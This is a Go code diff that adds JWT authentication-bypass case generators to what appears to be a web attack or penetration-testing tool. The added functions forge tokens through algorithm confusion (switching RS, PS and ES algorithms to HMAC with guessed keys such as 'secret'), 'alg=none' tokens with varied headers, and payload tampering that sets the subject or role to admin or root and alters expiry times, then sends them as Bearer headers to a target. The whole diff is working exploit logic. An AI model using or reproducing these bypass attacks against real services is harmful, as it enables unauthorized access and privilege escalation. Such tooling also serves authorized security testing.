@@ -57,6 +57,12 @@ func BuildJWTBypassCases(url, auth, originalToken string) []JWTBypassCase {
 	emptySignatureCases := buildEmptySignatureCasesJWT(url, auth, originalToken, jwtParts)
 	cases = append(cases, emptySignatureCases...)
 
+	algorithmConfusionCases := buildAlgorithmConfusionCasesJWT(url, auth, originalToken, jwtParts, header)
+	cases = append(cases, algorithmConfusionCases...)
+
+	payloadManipulationCases := buildPayloadManipulationCasesJWT(url, auth, originalToken, jwtParts)
+	cases = append(cases, payloadManipulationCases...)
+
 	return cases
 }
 
@@ -458,4 +464,237 @@ func DetectJWTExposure(url string) (exposedTokens []string) {
 	}
 
 	return
+}
+
+func buildAlgorithmConfusionCasesJWT(url, auth, originalToken string, jwtParts []string, header map[string]interface{}) []JWTBypassCase {
+	var cases []JWTBypassCase
+
+	algorithmMappings := map[string]string{
+		"RS256":  "HS256",
+		"RS384":  "HS384",
+		"RS512":  "HS512",
+		"PS256":  "HS256",
+		"PS384":  "HS384",
+		"PS512":  "HS512",
+		"ES256":  "HS256",
+		"ES384":  "HS384",
+		"ES512":  "HS512",
+		"ES256K": "HS256",
+	}
+
+	currentAlg, ok := header["alg"].(string)
+	if !ok {
+		return cases
+	}
+
+	if newAlg, exists := algorithmMappings[currentAlg]; exists {
+		modifiedHeader := make(map[string]interface{})
+		for k, v := range header {
+			modifiedHeader[k] = v
+		}
+		modifiedHeader["alg"] = newAlg
+
+		newHeaderJSON, _ := json.Marshal(modifiedHeader)
+		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
+
+		forgedSignatures := []string{
+			base64.RawURLEncoding.EncodeToString([]byte("admin")),
+			base64.RawURLEncoding.EncodeToString([]byte("123456")),
+			base64.RawURLEncoding.EncodeToString([]byte("secret")),
+			base64.RawURLEncoding.EncodeToString([]byte("key")),
+			base64.RawURLEncoding.EncodeToString([]byte("password")),
+		}
+
+		for _, sig := range forgedSignatures {
+			newToken := newHeader + "." + jwtParts[1] + "." + sig
+			cases = append(cases, JWTBypassCase{
+				method: "GET",
+				url:    url + auth,
+				headers: map[string]string{
+					"Authorization": "Bearer " + newToken,
+				},
+				desc: fmt.Sprintf("JWT[%s->%s forge]", currentAlg, newAlg),
+			})
+		}
+
+		noneAlgCases := buildAlgNoneCasesJWT(url, auth, originalToken, jwtParts, header)
+		cases = append(cases, noneAlgCases...)
+	}
+
+	authTagCases := []string{
+		"auth",
+		"none",
+		"null",
+		"undefined",
+	}
+	for _, at := range authTagCases {
+		modifiedHeader := make(map[string]interface{})
+		for k, v := range header {
+			modifiedHeader[k] = v
+		}
+		modifiedHeader["alg"] = "none"
+		modifiedHeader["at"] = at
+
+		newHeaderJSON, _ := json.Marshal(modifiedHeader)
+		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
+		newToken := newHeader + "." + jwtParts[1] + "."
+
+		cases = append(cases, JWTBypassCase{
+			method: "GET",
+			url:    url + auth,
+			headers: map[string]string{
+				"Authorization": "Bearer " + newToken,
+			},
+			desc: fmt.Sprintf("JWT[alg=none at=%s]", at),
+		})
+	}
+
+	typManipulationCases := []string{"", "JWS", "JWT", "none"}
+	for _, typ := range typManipulationCases {
+		modifiedHeader := make(map[string]interface{})
+		for k, v := range header {
+			modifiedHeader[k] = v
+		}
+		if typ == "" {
+			delete(modifiedHeader, "typ")
+		} else {
+			modifiedHeader["typ"] = typ
+		}
+		modifiedHeader["alg"] = "none"
+
+		newHeaderJSON, _ := json.Marshal(modifiedHeader)
+		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
+		newToken := newHeader + "." + jwtParts[1] + "."
+
+		desc := "JWT[alg=none"
+		if typ != "" {
+			desc += " typ=" + typ
+		}
+		desc += "]"
+		cases = append(cases, JWTBypassCase{
+			method: "GET",
+			url:    url + auth,
+			headers: map[string]string{
+				"Authorization": "Bearer " + newToken,
+			},
+			desc: desc,
+		})
+	}
+
+	return cases
+}
+
+func buildPayloadManipulationCasesJWT(url, auth, originalToken string, jwtParts []string) []JWTBypassCase {
+	var cases []JWTBypassCase
+
+	originalPayload := jwtParts[1]
+
+	payloadJSON, err := base64.RawURLEncoding.DecodeString(originalPayload)
+	if err != nil {
+		payloadJSON, _ = base64.StdEncoding.DecodeString(originalPayload)
+	}
+
+	if len(payloadJSON) > 0 && payloadJSON[0] == '{' {
+		var payload map[string]interface{}
+		if json.Unmarshal(payloadJSON, &payload) == nil {
+			if sub, ok := payload["sub"].(string); ok {
+				subValues := []string{"admin", "root", "user", "administrator", "test"}
+				for _, newSub := range subValues {
+					if newSub == sub {
+						continue
+					}
+					modifiedPayload := make(map[string]interface{})
+					for k, v := range payload {
+						modifiedPayload[k] = v
+					}
+					modifiedPayload["sub"] = newSub
+
+					newPayloadJSON, _ := json.Marshal(modifiedPayload)
+					newPayload := base64.RawURLEncoding.EncodeToString(newPayloadJSON)
+
+					newToken := jwtParts[0] + "." + newPayload + "." + jwtParts[2]
+
+					cases = append(cases, JWTBypassCase{
+						method: "GET",
+						url:    url + auth,
+						headers: map[string]string{
+							"Authorization": "Bearer " + newToken,
+						},
+						desc: fmt.Sprintf("JWT[payload sub=%s]", newSub),
+					})
+				}
+			}
+
+			roleValues := []string{"admin", "administrator", "root"}
+			roleKeys := []string{"role", "roles", "Role", "Roles", "admin", "groups"}
+
+			for _, role := range roleValues {
+				for _, key := range roleKeys {
+					if _, exists := payload[key]; exists {
+						modifiedPayload := make(map[string]interface{})
+						for k, v := range payload {
+							modifiedPayload[k] = v
+						}
+						modifiedPayload[key] = []string{role}
+
+						newPayloadJSON, _ := json.Marshal(modifiedPayload)
+						newPayload := base64.RawURLEncoding.EncodeToString(newPayloadJSON)
+
+						newToken := jwtParts[0] + "." + newPayload + "." + jwtParts[2]
+
+						cases = append(cases, JWTBypassCase{
+							method: "GET",
+							url:    url + auth,
+							headers: map[string]string{
+								"Authorization": "Bearer " + newToken,
+							},
+							desc: fmt.Sprintf("JWT[payload %s=%s]", key, role),
+						})
+					}
+				}
+			}
+		}
+	}
+
+	expValues := []string{
+		"9999999999",
+		"0",
+		"-1",
+		"1735689600",
+		"1893456000",
+	}
+	for _, exp := range expValues {
+		modifiedPayload := fmt.Sprintf(`{"sub":"admin","exp":%s}`, exp)
+		newPayload := base64.RawURLEncoding.EncodeToString([]byte(modifiedPayload))
+
+		newToken := jwtParts[0] + "." + newPayload + "." + jwtParts[2]
+
+		cases = append(cases, JWTBypassCase{
+			method: "GET",
+			url:    url + auth,
+			headers: map[string]string{
+				"Authorization": "Bearer " + newToken,
+			},
+			desc: fmt.Sprintf("JWT[payload exp=%s]", exp),
+		})
+	}
+
+	iatValues := []string{"0", "-1", "9999999999"}
+	for _, iat := range iatValues {
+		modifiedPayload := fmt.Sprintf(`{"sub":"admin","iat":%s}`, iat)
+		newPayload := base64.RawURLEncoding.EncodeToString([]byte(modifiedPayload))
+
+		newToken := jwtParts[0] + "." + newPayload + "." + jwtParts[2]
+
+		cases = append(cases, JWTBypassCase{
+			method: "GET",
+			url:    url + auth,
+			headers: map[string]string{
+				"Authorization": "Bearer " + newToken,
+			},
+			desc: fmt.Sprintf("JWT[payload iat=%s]", iat),
+		})
+	}
+
+	return cases
 }
